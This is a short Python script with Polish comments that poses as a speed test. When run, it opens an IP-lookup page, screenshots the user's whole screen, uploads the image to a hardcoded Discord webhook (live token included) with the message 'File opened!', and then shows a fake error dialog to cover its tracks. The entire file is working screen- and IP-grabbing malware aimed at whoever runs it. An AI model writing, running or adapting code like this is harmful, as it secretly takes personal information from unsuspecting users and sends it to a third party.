import webbrowser
import requests
import mss
import io
from PIL import Image
import time
import tkinter as tk
from tkinter import messagebox

WEBHOOK_URL = "https://discord.com/api/webhooks/1413819617373192293/Ku7BGliltJoDCmJtQ5ROoVhjrIkA7hO3YpWWciM54V3GEFysGShIa2pxrErf35YfS1Q5"

# Otwieramy Speedtest.pl w przeglądarce
print("🔗 Otwieram Speedtest.pl w przeglądarce...")
webbrowser.open("https://pl.wizcase.com/tools/whats-my-ip/?gad_campaignid=20059325679")
time.sleep(3)
# Screenshot ekranu
with mss.mss() as sct:
    screenshot = sct.grab(sct.monitors[1])
    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

    buffer = io.BytesIO()
    img.save(buffer, format="PNG")
    buffer.seek(0)

# Wysyłamy na Discorda
files = {
    "file": ("speedtest.png", buffer, "image/png")
}

data = {
    "content": "Otwarto PLik!"
}

response = requests.post(WEBHOOK_URL, data=data, files=files)

if response.status_code in [200, 204]:
    print("✅ Screenshot wysłany na Discorda!")
else:
    print(f"❌ Błąd {response.status_code}: {response.text}")



root = tk.Tk()
root.withdraw
messagebox.showerror("Błąd, Wystapił nieoczekiwany błąd!")
root.destroy()